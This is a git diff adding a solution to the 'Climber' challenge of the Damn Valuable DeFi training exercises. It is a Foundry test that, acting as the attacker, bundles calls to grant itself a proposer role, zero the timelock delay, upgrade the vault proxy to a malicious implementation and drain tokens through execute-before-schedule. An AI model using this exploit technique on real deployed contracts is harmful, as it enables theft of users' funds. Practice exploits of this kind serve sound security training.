@@ -8,6 +8,8 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
+import {AttackVault} from "../../../src/Contracts/attack/AttackVault.sol";
+import {AttackClimber} from "../../../src/Contracts/attack/AttackClimber.sol";
 
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
@@ -72,6 +74,51 @@ contract Climber is Test {
         /**
          * EXPLOIT START *
          */
+
+        console.log(attacker);
+        console.log(address(climberTimelock));
+        console.log(address(climberVaultProxy));
+        console.log(address(dvt));
+
+        vm.startPrank(attacker);
+
+        bytes32 PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
+
+        AttackVault vaultToReplace = new AttackVault();
+
+        AttackClimber attackClimber = new AttackClimber(
+            address(climberVaultProxy),
+            payable(climberTimelock),
+            address(dvt),
+            address(attacker)
+        );
+
+        bytes memory grantRoleData =
+            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(attackClimber));
+        bytes memory updateDelayData = abi.encodeWithSignature("updateDelay(uint64)", uint64(0));
+        bytes memory upgradeData = abi.encodeWithSignature("upgradeTo(address)", address(vaultToReplace));
+        bytes memory attackData = abi.encodeWithSignature("attack()");
+
+        address[] memory targets = new address[](4);
+        targets[0] = address(climberTimelock);
+        targets[1] = address(climberTimelock);
+        targets[2] = address(climberVaultProxy);
+        targets[3] = address(attackClimber);
+
+        bytes[] memory data = new bytes[](4);
+        data[0] = grantRoleData;
+        data[1] = updateDelayData;
+        data[2] = upgradeData;
+        data[3] = attackData;
+
+        attackClimber.setScheduleData(targets, data);
+
+        uint256[] memory amounts = new uint256[](targets.length);
+        climberTimelock.execute(targets, amounts, data, 0);
+
+        attackClimber.withdraw();
+
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
